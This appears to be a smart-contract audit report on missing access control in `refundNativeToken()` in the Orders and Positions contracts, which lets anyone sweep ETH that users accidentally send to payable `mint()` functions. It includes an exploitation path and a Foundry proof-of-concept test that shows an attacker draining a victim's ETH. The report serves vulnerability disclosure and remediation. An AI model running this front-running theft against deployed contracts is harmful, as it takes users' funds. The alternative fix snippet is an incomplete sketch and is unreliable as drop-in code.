## Title
Lack of Access Control in `refundNativeToken()` Allows Theft of Accidentally Sent ETH from Payable NFT Mint Functions

## Summary
The `BaseNonfungibleToken.mint()` and `mint(bytes32)` functions are marked as `payable` but explicitly ignore `msg.value`, causing any ETH sent to these functions to remain in the contract. [1](#0-0)  The `PayableMulticallable.refundNativeToken()` function, inherited by both `Orders` and `Positions` contracts, refunds ALL contract balance to `msg.sender` without any access control or tracking of who originally sent the ETH. [2](#0-1)  This allows any attacker to frontrun and steal ETH accidentally sent by users.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- `src/base/BaseNonfungibleToken.sol` - `mint()` (lines 109-117) and `mint(bytes32 salt)` (lines 123-126)
- `src/base/PayableMulticallable.sol` - `refundNativeToken()` (lines 25-29)
- `src/Orders.sol` - inherits both BaseNonfungibleToken and PayableMulticallable [3](#0-2) 
- `src/Positions.sol` - inherits BasePositions which inherits both BaseNonfungibleToken and PayableMulticallable [4](#0-3) 

**Intended Logic:** 
The `mint()` functions are made `payable` to work with multicall patterns where ETH might be forwarded, but no minting fees are collected. Users can call `refundNativeToken()` to recover unused ETH after multicall operations. [5](#0-4) 

**Actual Logic:** 
When users call `mint()` or `mint(bytes32)` directly with ETH (outside of multicall), the ETH is stored in the contract. The `refundNativeToken()` function has no access control and sends `address(this).balance` to `msg.sender`, allowing any attacker to steal the ETH. [6](#0-5) 

**Exploitation Path:**
1. Victim Alice calls `Orders.mint()` or `Positions.mint()` with 1 ETH accidentally (e.g., reusing transaction data from another contract)
2. The `mint()` function executes successfully, minting an NFT to Alice, but the 1 ETH remains in the Orders/Positions contract balance
3. Attacker Bob monitors the mempool or blockchain and sees Alice's transaction
4. Bob immediately calls `Orders.refundNativeToken()` or `Positions.refundNativeToken()`
5. The function sends all 1 ETH to Bob (`msg.sender`), permanently stealing Alice's funds

**Security Property Broken:** Direct theft of user funds - violates the protocol's fundamental security guarantee of protecting user assets.

## Impact Explanation
- **Affected Assets**: Native ETH accidentally sent to `Orders.mint()` or `Positions.mint()` functions
- **Damage Severity**: Complete loss of accidentally sent ETH for affected users. Any amount of ETH sent to these functions can be stolen by attackers with no upper limit.
- **User Impact**: Any user who accidentally sends ETH when minting NFT positions or orders. This is particularly likely for:
  - Users copying transaction data from other contracts that require ETH payment
  - Wallet interfaces that default to including ETH value
  - Contract integrations that forward ETH incorrectly

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this - requires only calling a public function
- **Preconditions**: A user must accidentally send ETH when calling `mint()` functions on Orders or Positions contracts
- **Execution Complexity**: Single transaction - attacker simply calls `refundNativeToken()` after seeing victim's transaction
- **Frequency**: Can be exploited continuously - every time a user accidentally sends ETH, it becomes vulnerable to theft until claimed

## Recommendation

The `refundNativeToken()` function should be removed or redesigned to track legitimate refund claims. The recommended fix is to remove the function entirely since:
1. The core protocol operations (Orders and Positions) immediately forward ETH to the FlashAccountant [7](#0-6) [8](#0-7) 
2. In multicall scenarios, any unused ETH should be handled within the atomic transaction
3. There is no legitimate case where ETH should remain in these contracts between transactions

Alternative mitigation: Implement access control tracking:
```solidity
// In src/base/PayableMulticallable.sol:

// Add storage to track ETH deposits per address
mapping(address => uint256) private _ethDeposits;

// Modify refundNativeToken to only refund caller's deposited amount
function refundNativeToken() external payable {
    uint256 refundAmount = _ethDeposits[msg.sender];
    if (refundAmount != 0) {
        _ethDeposits[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}

// Track deposits in mint and other payable functions
function mint() public payable returns (uint256 id) {
    if (msg.value > 0) {
        _ethDeposits[msg.sender] += msg.value;
    }
    // ... existing logic
}
```

## Proof of Concept
```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import {Orders} from "../src/Orders.sol";
import {Positions} from "../src/Positions.sol";
import {Core} from "../src/Core.sol";
import {TWAMM} from "../src/extensions/TWAMM.sol";
import {FullTest} from "./FullTest.sol";

contract Exploit_RefundNativeTokenTheft is FullTest {
    
    function test_RefundNativeTokenTheft_Orders() public {
        // SETUP: Victim (Alice) and Attacker (Bob)
        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        
        vm.deal(alice, 10 ether);
        vm.deal(bob, 1 ether);
        
        // EXPLOIT Step 1: Alice accidentally sends 1 ETH with mint()
        vm.prank(alice);
        uint256 aliceInitialBalance = alice.balance;
        orders.mint{value: 1 ether}();
        
        // Verify: Alice's ETH is now in the Orders contract
        assertEq(address(orders).balance, 1 ether, "ETH stuck in Orders contract");
        assertEq(alice.balance, aliceInitialBalance - 1 ether, "Alice lost 1 ETH");
        
        // EXPLOIT Step 2: Bob (attacker) sees this and calls refundNativeToken()
        vm.prank(bob);
        uint256 bobInitialBalance = bob.balance;
        orders.refundNativeToken();
        
        // VERIFY: Bob stole Alice's ETH
        assertEq(bob.balance, bobInitialBalance + 1 ether, "Bob gained 1 ETH");
        assertEq(address(orders).balance, 0, "Orders contract now empty");
        assertEq(alice.balance, aliceInitialBalance - 1 ether, "Alice permanently lost 1 ETH");
    }
    
    function test_RefundNativeTokenTheft_Positions() public {
        // SETUP: Victim (Alice) and Attacker (Bob)
        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        
        vm.deal(alice, 10 ether);
        vm.deal(bob, 1 ether);
        
        // EXPLOIT Step 1: Alice accidentally sends 2 ETH with mint()
        vm.prank(alice);
        uint256 aliceInitialBalance = alice.balance;
        positions.mint{value: 2 ether}();
        
        // Verify: Alice's ETH is now in the Positions contract
        assertEq(address(positions).balance, 2 ether, "ETH stuck in Positions contract");
        assertEq(alice.balance, aliceInitialBalance - 2 ether, "Alice lost 2 ETH");
        
        // EXPLOIT Step 2: Bob (attacker) calls refundNativeToken()
        vm.prank(bob);
        uint256 bobInitialBalance = bob.balance;
        positions.refundNativeToken();
        
        // VERIFY: Bob stole Alice's ETH
        assertEq(bob.balance, bobInitialBalance + 2 ether, "Bob gained 2 ETH");
        assertEq(address(positions).balance, 0, "Positions contract now empty");
        assertEq(alice.balance, aliceInitialBalance - 2 ether, "Alice permanently lost 2 ETH");
    }
}
```

## Notes

This vulnerability exists because the `payable` modifier on `mint()` functions was added to support multicall patterns, but the refund mechanism lacks proper access control. The protocol's legitimate ETH handling occurs within the flash accounting system where ETH is immediately forwarded to the FlashAccountant. [9](#0-8) [10](#0-9) 

Neither the `Orders` nor `Positions` contracts implement `receive()` or `fallback()` functions, so ETH can only enter through payable functions. The `burn()` function also has the same issue as it's marked payable and ignores msg.value. [11](#0-10)

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L104-126)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Generates a salt using prevrandao() and gas() for pseudorandomness.
    ///      Note: This can encounter conflicts if a sender sends two identical transactions
    ///      in the same block that consume exactly the same amount of gas.
    ///      No fees are collected; any msg.value sent is ignored.
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }

    /// @inheritdoc IBaseNonfungibleToken
    /// @dev The token ID is generated using saltToId(msg.sender, salt). This prevents the need
    ///      to store a counter of how many tokens were minted, as IDs are deterministic.
    ///      No fees are collected; any msg.value sent is ignored.
    function mint(bytes32 salt) public payable returns (uint256 id) {
        id = saltToId(msg.sender, salt);
        _mint(msg.sender, id);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L128-135)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
    ///      No fees are collected; any msg.value sent is ignored.
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/PayableMulticallable.sol (L21-29)
```text
    /// @notice Refunds any remaining native token balance to the caller
    /// @dev Allows callers to recover ETH that was sent for transient payments but not fully consumed
    ///      This is useful when exact payment amounts are difficult to calculate in advance
    ///      Only refunds if there is a non-zero balance to avoid unnecessary gas costs
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/Orders.sol (L146-151)
```text
                if (saleRateDelta > 0) {
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
                    } else {
                        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
                    }
```

**File:** src/base/BasePositions.sol (L29-29)
```text
abstract contract BasePositions is IPositions, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/base/BasePositions.sol (L253-262)
```text
            if (poolKey.token0 != NATIVE_TOKEN_ADDRESS) {
                ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
            } else {
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
                if (amount1 != 0) {
                    ACCOUNTANT.payFrom(caller, poolKey.token1, amount1);
                }
            }
```
